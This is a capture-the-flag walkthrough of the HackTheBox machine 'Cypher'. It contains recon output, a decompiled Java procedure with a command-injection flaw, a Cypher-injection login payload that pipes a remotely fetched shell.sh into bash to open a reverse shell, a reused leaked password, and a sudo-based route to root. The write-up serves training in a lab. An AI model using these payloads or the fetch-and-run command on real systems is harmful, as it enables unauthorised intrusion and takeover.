1,Recon
port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Check `whatweb` here
```
http://cypher.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.57], JQuery[3.6.1], Script, Title[GRAPH ASM], nginx[1.24.0]

```

Seems like nothing interesting here.

Page check
![](images/Pasted%20image%2020250307173520.png)
By fuzz the valid web-contents, I found 
```
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 26ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 30ms]
index.html              [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 30ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 40ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]

```
In this place, `/testing` would be interesting here.
![](images/Pasted%20image%2020250307173821.png)
Then we can get the jar file here, we can use `jd-gui` to decompile it 
![](images/Pasted%20image%2020250309183147.png)
Then we can find the command injection here.
```
  
public class CustomFunctions {  
  @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)  
  @Description("Returns the HTTP status code for the given URL as a string")  
  public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {  
    if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://"))  
      url = "https://" + url;   
    String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };  
    System.out.println("Command: " + Arrays.toString((Object[])command));  
    Process process = Runtime.getRuntime().exec(command);  
    BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));  
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));  
    StringBuilder errorOutput = new StringBuilder();  
    String line;  
    while ((line = errorReader.readLine()) != null)  
      errorOutput.append(line).append("\n");   
    String statusCode = inputReader.readLine();  
    System.out.println("Status code: " + statusCode);  
    boolean exited = process.waitFor(10L, TimeUnit.SECONDS);  
    if (!exited) {  
      process.destroyForcibly();  
      statusCode = "0";  
      System.err.println("Process timed out after 10 seconds");  
    } else {  
      int exitCode = process.exitValue();  
      if (exitCode != 0) {  
        statusCode = "0";  
        System.err.println("Process exited with code " + exitCode);  
      }   
    }   
    if (errorOutput.length() > 0)  
      System.err.println("Error output:\n" + errorOutput.toString());   
    return Stream.of(new StringOutput(statusCode));  
  }
```
The injection point is here:
`String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};`
In summary, the code is used to make an HTTP request and return the HTTP status code, which is a good attack vector for us.

To exploit this, we need to go to the login page. This page is vulnerable to Cypher Injection, so let's use this payload in the "username" parameter: 
```
{"username":"admin' return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.com;curl 10.10.xx.xx/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//","password":"Password123"}
```
Then our request would be 
```
POST /api/auth HTTP/1.1
Host: cypher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 29
Origin: http://cypher.htb
DNT: 1
Sec-GPC: 1
Connection: close
Referer: http://cypher.htb/login
Priority: u=0

{"username":"admin' return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.com;curl 10.10.16.10/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//","password":"Password123"}
```
Then remember make your own shell.sh and open the netcat to listen the port

Finally, we can get the user shell as `neo4j`

2, shell as `graphasm`
Then we can find a file `bbot_preset.yml` from `/home/graphasm`
```
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```
Very luckily, we can login to `graphasm` by using the password before `cU4btyib.20xtCMCXkBmerhK`

3, shell as root
Firstly, I would like check the `sudo -l` 
```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

For privilege escalation, while logged in as the graphasm user, using "sudo -l" we see that we can execute a binary as root. Just run this command to obtain the root.txt: `sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run`
